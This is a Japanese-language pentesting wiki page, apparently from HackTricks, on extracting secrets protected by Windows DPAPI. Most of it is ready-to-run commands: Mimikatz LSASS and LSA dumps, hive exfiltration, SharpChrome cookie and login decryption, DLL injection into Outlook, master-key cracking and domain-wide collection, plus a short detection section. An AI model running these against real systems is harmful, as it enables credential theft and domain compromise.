# DPAPI - パスワードの抽出

{{#include ../../banners/hacktricks-training.md}}



## DPAPI とは

Data Protection API (DPAPI) は、主に Windows オペレーティングシステム内で、ユーザーまたはシステムの secrets を主要な entropy の源として利用し、**非対称秘密鍵の対称暗号化**に使用されます。この方式では、ユーザーのログオン secrets から派生した鍵、またはシステムの暗号化の場合はシステムのドメイン認証 secrets を使ってデータを暗号化できるため、開発者が暗号化鍵自体の保護を管理する必要がなくなり、暗号化が簡単になります。

DPAPI の最も一般的な使用方法は、**`CryptProtectData` および `CryptUnprotectData`** 関数を使用することです。これらの関数により、アプリケーションは現在ログオンしているプロセスの security context を使用してデータを暗号化および復号できます。デフォルトでは、暗号化したデータを復号できるのは、暗号化を実行したものと同じユーザーまたはシステム context のみです。<sup>[[2]](#references)[[3]](#references)</sup>

これらの関数は、暗号化および復号時に使用されるオプションの **entropy parameter** も受け取ります。オプションの entropy で保護されたデータを復号するには、同じ entropy 値が必要です。<sup>[[2]](#references)[[6]](#references)</sup>

### Users key generation

DPAPI は、ユーザーの credentials からユーザー固有の値（**pre-key** と呼ばれることが多い）を派生させます。正確な派生方法はアカウントとオペレーティングシステムのバージョンによって異なります。domain users の場合、tooling によってユーザーの NTLM material から必要な値を派生させることができます。<sup>[[2]](#references)</sup>

これは、攻撃者がユーザーの password hash を取得できた場合、次のことが可能になるため、特に重要です。

- そのユーザーの key を使用して **DPAPI で暗号化されたデータを復号**する。API に接続する必要はありません
- 有効な DPAPI key の生成を試みながら、オフラインで **password の crack**を試行する

DPAPI は、保護対象の blob ごとに新しい master key を作成するのではなく、各ユーザーに対して 1 つ以上の **master keys** を保持します。各 master key には **GUID** (Globally Unique Identifier) があり、暗号化された blob には、それを保護する master key が記録されています。<sup>[[2]](#references)</sup>

Master keys は **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** directory に保存されます。ここで `{SID}` はユーザーの Security Identifier です。master-key file には、ユーザーの **pre-key** によって保護された material と、domain users の場合は **domain backup key** によって保護された recovery material が含まれています。<sup>[[2]](#references)</sup>

なお、master key の暗号化に使用される **domain key は domain controllers に保存され、変更されることがありません**。そのため、攻撃者が domain controller にアクセスできる場合、domain backup key を取得し、domain 内のすべてのユーザーの master keys を復号できます。<sup>[[2]](#references)</sup>

暗号化された blobs には、データの暗号化に使用された **master key の GUID** が header 内に含まれています。

> [!TIP]
> DPAPI encrypted blobs は **`01 00 00 00`** で始まります

master keys を検索します。
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
ユーザーの Master Keys が大量にある場合は、次のようになります：

![DPAPI とは - Users key generation：ユーザーの Master Keys が大量にある場合は、次のようになります](<../../images/image (1121).png>)

### Machine/System key generation

これは、machine がデータを暗号化するために使用する key です。**DPAPI_SYSTEM LSA secret** に基づいており、SYSTEM user だけがアクセスできる特別な key です。この key は、machine-level credentials や system-wide secrets など、system 自体がアクセスする必要のあるデータの暗号化に使用されます。<sup>[[2]](#references)</sup>

これらの key には **domain backup がない** ため、ローカルからのみアクセスできます：

- **Mimikatz** は、次の command で LSA secrets を dump してアクセスできます：`mimikatz lsadump::secrets`
- secret は registry 内に保存されているため、administrator は **アクセスするために DACL permissions を変更できます**。registry path は次のとおりです：`HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- registry hives からの Offline extraction も可能です。たとえば、target 上で administrator として hives を保存し、exfiltrate します：
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
次に、analysis box で hives から DPAPI_SYSTEM LSA secret を復元し、それを使用して machine-scope blobs（scheduled task のパスワード、service credentials、Wi‑Fi profiles など）を復号します:
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
### DPAPIによって保護されるデータ

DPAPIによって保護される個人データには、以下が含まれます。

- Windows creds
- Internet ExplorerおよびGoogle Chromeのpasswordsと自動入力データ
- OutlookやWindows MailなどのアプリケーションのE-mailおよび内部FTPアカウントのpasswords
- 共有フォルダー、リソース、wireless networks、Windows Vaultのpasswords（暗号化キーを含む）
- remote desktop connections、.NET Passportのpasswords、およびさまざまな暗号化・認証用途のprivate keys
- Credential Managerで管理されるnetwork passwords、およびSkype、MSN messengerなど、CryptProtectDataを使用するアプリケーション内の個人データ
- レジストリ内の暗号化されたblobs
- ...

システムによって保護されるデータには、以下が含まれます。
- Wifi passwords
- Scheduled task passwords
- ...

### Master keyの抽出オプション

- ユーザーがdomain admin権限を持っている場合、**domain backup key**にアクセスして、ドメイン内のすべてのユーザーのmaster keysを復号できます：
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- ローカル管理者権限があれば、**LSASS memory にアクセス**して、接続中のすべてのユーザーの DPAPI master keys と SYSTEM key を抽出できます。
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- ユーザーがローカル管理者権限を持っている場合、**DPAPI_SYSTEM LSA secret** にアクセスして、マシンの master keys を復号できます。
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- ユーザーのパスワードまたはNTLM hashが既知の場合、**ユーザーのmaster keyを直接decryptできます**：
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- ユーザーとしてセッション内にいる場合、**RPCを使用してマスターキーを復号するためのバックアップキー**をDCに要求できます。ローカル管理者で、ユーザーがログインしている場合は、このために**ユーザーのセッショントークンを盗む**ことができます：
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Vault の一覧表示
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## DPAPI で暗号化されたデータへのアクセス

### DPAPI で暗号化されたデータを探す

一般ユーザーの**保護されたファイル**は、以下にあります:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- 上記のパスで `\Roaming\` を `\Local\` に変更した場所も確認します。

列挙の例:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) は、ファイルシステム、レジストリ、B64 blobs 内の DPAPI encrypted blobs を見つけることができます。<sup>[[12]](#references)</sup>
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
[同じ repo にある](https://github.com/GhostPack/SharpDPAPI) [**SharpChrome**] を使用すると、cookies などの DPAPI で保護された機密データを復号できます。<sup>[[12]](#references)</sup>

#### Chromium/Edge/Electron の quick recipes（SharpChrome）

- Current user の保存済みログイン情報/cookies を対話的に復号（user context で実行すると、ユーザーの Credential Manager から追加キーが解決されるため、Chrome 127 以降の app-bound cookies でも動作します）：
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- ファイルしかない場合のオフライン分析。まずプロファイルの "Local State" から AES state key を抽出し、それを使って cookie DB を復号します：
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- DPAPI domain backup key (PVK) と対象ホストの admin 権限がある場合のドメイン全体／remote triage：
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- ユーザーの DPAPI prekey/credkey（LSASS から取得）を持っている場合、password cracking を省略して、プロファイルデータを直接復号できます：
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
注記
- 新しい Chrome/Edge ビルドでは、特定の cookies が「App-Bound」暗号化を使用して保存される場合があります。追加の app-bound key がないと、それらの cookies を offline で復号することはできません。取得対象ユーザーのコンテキストで SharpChrome を実行すると、自動的に取得できます。詳細については、以下で参照されている Chrome security blog post を参照してください。<sup>[[5]](#references)</sup>

### アクセスキーとデータ

- **SharpDPAPI を使用して**、現在のセッションの DPAPI で暗号化されたファイルから credentials を取得します。
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **認証情報を取得**（暗号化されたデータや guidMasterKey など）。<sup>[[3]](#references)</sup>
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **masterkeyへのアクセス**:

RPCを使用して、**domain backup key**を要求しているユーザーのmasterkeyを復号する:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
**SharpDPAPI** ツールは masterkey の復号化用に、次の引数にも対応しています（`/rpc` を使用してドメインの backup key を取得したり、`/password` を使用してプレーンテキストのパスワードを指定したり、`/pvk` を使用して DPAPI ドメイン秘密鍵ファイルを指定したりできる点に注目してください...）：<sup>[[12]](#references)</sup>
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **masterkeyを使用してデータを復号する**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
**SharpDPAPI** ツールは、`credentials|vaults|rdg|keepass|triage|blob|ps` の復号化に対して、以下の引数もサポートしています（`/rpc` を使用してドメインのバックアップキーを取得したり、`/password` を使用して平文のパスワードを指定したり、`/pvk` を使用して DPAPI ドメイン秘密鍵ファイルを指定したり、`/unprotect` を使用して現在のユーザーのセッションを使用したりできる点に注目してください）。<sup>[[12]](#references)</sup>
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- DPAPI prekey/credkeyを直接使用する（パスワード不要）

LSASSをdumpできる場合、Mimikatzは、平文のパスワードを知らなくてもユーザーのmasterkeyを復号できる、ログオンごとのDPAPI keyを公開することがよくあります。この値をtoolingに直接渡します：
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- **現在のユーザーセッション**を使用してデータを復号化する:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---

### Impacket dpapi.py による Offline decryption

被害ユーザーの SID とパスワード（または NT hash）があれば、Impacket の dpapi.py を使用して DPAPI masterkeys と Credential Manager blobs を完全に offline で復号できます。<sup>[[10]](#references)[[11]](#references)</sup>

- ディスク上の artefacts を特定します。
- Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
- 対応する masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- ファイル転送 tooling が不安定な場合は、ホスト上でファイルを base64 に変換し、その出力をコピーします。
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- ユーザーの SID と password/hash を使用して masterkey を復号する：
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- 復号された masterkey を使用して credential blob を復号する：
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
このワークフローでは、Windows Credential Manager を使用するアプリに保存されたドメイン認証情報（管理者アカウント（例：`*_adm`）を含む）を回収できることがよくあります。

---

### Optional Entropy（"Third-party entropy"）の処理

一部のアプリケーションは、追加の **entropy** 値を `CryptProtectData` に渡します。この値がない場合、正しい masterkey が判明していても blob を復号できません。そのため、この方法で保護された認証情報（Microsoft Outlook や一部の VPN クライアントなど）を対象とする場合、entropy の取得が不可欠です。

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture)（2022）は、対象プロセス内の DPAPI 関数を hook し、渡された optional entropy を透過的に記録する user-mode DLL です。`outlook.exe` や `vpnclient.exe` などのプロセスに対して **DLL-injection** mode で EntropyCapture を実行すると、各 entropy buffer を呼び出し元プロセスおよび blob に対応付けたファイルが出力されます。取得した entropy は、後から **SharpDPAPI**（`/entropy:`）または **Mimikatz**（`/entropy:<file>`）に渡してデータを復号できます。<sup>[[6]](#references)</sup>
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### masterkeys の offline cracking (Hashcat & DPAPISnoop)

Microsoft は Windows 10 v1607 (2016) 以降、**context 3** の masterkey format を導入しました。`hashcat` v6.2.6 (2023 年 12 月) では、hash-mode **22100** (DPAPI masterkey v1 context)、**22101** (context 1)、**22102** (context 3) が追加され、masterkey file から user password を直接 GPU-accelerated cracking できるようになりました。そのため、Attackers は target system と対話せずに word-list または brute-force attacks を実行できます。<sup>[[7]](#references)</sup>

`DPAPISnoop` (2024) はこの process を自動化します：
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
このツールは Credential と Vault の blob も解析でき、cracked keys で復号して cleartext passwords をエクスポートできます。<sup>[[8]](#references)</sup>


### 他のマシンのデータにアクセスする

**SharpDPAPI と SharpChrome** では、**`/server:HOST`** オプションを指定してリモートマシンのデータにアクセスできます。もちろん、そのマシンにアクセスできる必要があり、以下の例では **domain backup encryption key が既知である**と仮定しています。
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## その他のツール

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) は、LDAP directory からすべてのユーザーとコンピューターを抽出し、RPC 経由で domain controller の backup key を抽出する処理を自動化するツールです。その後、スクリプトはすべてのコンピューターの IP address を解決し、各コンピューターに対して smbclient を実行して、すべてのユーザーの DPAPI blobs を取得し、domain backup key を使ってすべてを復号します。

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

LDAP から抽出したコンピューター一覧を使えば、把握していなかった場合でも、すべてのサブネットワークを見つけられます！

### DonPAPI 2.x（2024-05）

[**DonPAPI**](https://github.com/login-securite/DonPAPI) は、DPAPI によって保護された secrets を自動的に dump できます。2.x release では、以下が導入されました:<sup>[[9]](#references)</sup>

* 数百台の host から blobs を parallel collection
* **context 3** masterkeys の parsing と Hashcat cracking integration の自動化
* Chrome の「App-Bound」encrypted cookies のサポート（次のセクションを参照）
* 新しい `--snapshot` mode。endpoints を繰り返し poll し、新しく作成された blobs を diff

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) は、masterkey/credential/vault files 用の C# parser であり、Hashcat/JtR formats を出力でき、必要に応じて cracking を自動的に実行できます。Windows 11 24H1 までの machine および user masterkey formats を完全にサポートしています。<sup>[[8]](#references)</sup>


## よくある検知

- `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`、`C:\Users\*\AppData\Roaming\Microsoft\Credentials\*`、その他の DPAPI-related directories 内の files への access。
- 特に **C$** や **ADMIN$** などの network share 経由の access。
- **Mimikatz**、**SharpDPAPI**、または同様の tooling を使用して LSASS memory に access したり、masterkeys を dump したりする行為。
- Event **4662**: *An operation was performed on an object* – **`BCKUPKEY`** object への access と correlation できます。
- process が *SeTrustedCredManAccessPrivilege*（Credential Manager）を request した場合の Event **4673/4674**。

---
### 2023-2025 の vulnerabilities と ecosystem の変化

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing**（2023 年 11 月）。network access を持つ attacker は、domain member を欺いて malicious な DPAPI backup key を取得させることができ、user masterkeys の decryption が可能でした。2023 年 11 月の cumulative update で patch 済みです – administrators は DC と workstations が完全に patch されていることを確認する必要があります。<sup>[[4]](#references)</sup>
* **Chrome 127 の「App-Bound」cookie encryption**（2024 年 7 月）では、legacy の DPAPI-only protection が、user の **Credential Manager** に保存される追加の key に置き換えられました。cookies の offline decryption には、DPAPI masterkey と **GCM-wrapped app-bound key** の両方が必要になりました。SharpChrome v2.3 と DonPAPI 2.x は、user context で実行した場合に追加の key を recover できます。<sup>[[5]](#references)</sup>


### Case Study: Zscaler Client Connector – SID から導出される Custom Entropy

Zscaler Client Connector は、`C:\ProgramData\Zscaler` 配下に複数の configuration files（例: `config.dat`、`users.dat`、`*.ztc`、`*.mtt`、`*.mtc`、`*.mtp`）を保存します。各 file は **DPAPI (Machine scope)** で encrypted されていますが、vendor は disk 上に保存する代わりに、*runtime で calculated* される **custom entropy** を提供します。<sup>[[1]](#references)</sup>

entropy は、次の 2 つの要素から再構築されます。

1. `ZSACredentialProvider.dll` 内に embedded された hard-coded secret。
2. configuration が属する Windows account の **SID**。

DLL に実装された algorithm は、以下と equivalent です。
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
シークレットはディスクから読み取れる DLL に埋め込まれているため、**SYSTEM 権限を持つローカル攻撃者は、任意の SID の entropy を再生成し、blob をオフラインで復号できます**:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
復号すると完全な JSON configuration が得られ、すべての **device posture check** とその期待値が含まれます。これは client-side bypass を試みる際に非常に価値の高い情報です。

> TIP: その他の暗号化された artefacts（`*.mtt`、`*.mtp`、`*.mtc`、`*.ztc`）は、entropy なし（`16` 個のゼロバイト）で DPAPI によって保護されています。そのため、SYSTEM privileges を取得すれば、`ProtectedData.Unprotect` で直接復号できます。

## References

- [1] [Synacktiv – zero trust を信頼すべきか？Zscaler posture checks の bypass](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [2] [DPAPI Secrets。DPAPI における Security analysis と data recovery](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [3] [Mimikatz と C++ を使用した DPAPI Encrypted Secrets の読み取り](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [4] [CVE-2023-36004 - Windows DPAPI（Data Protection Application Programming Interface）Spoofing Vulnerability](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [5] [Windows における Chrome cookies の Security 改善](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [6] [EntropyCapture: DPAPI Optional Entropy の Simple Extraction](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [7] [hashcat v6.2.6 release notes](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [8] [DPAPISnoop – GitHub repository](https://github.com/Leftp/DPAPISnoop)
- [9] [DonPAPI 2.0.1 – PyPI project page](https://pypi.org/project/donpapi/2.0.0/)
- [10] [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [11] [HTB Puppy: AD ACL abuse、KeePassXC Argon2 cracking、DPAPI decryption による DC admin への昇格](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [12] [GhostPack SharpDPAPI/SharpChrome – Usage と options](https://github.com/GhostPack/SharpDPAPI)
{{#include ../../banners/hacktricks-training.md}}
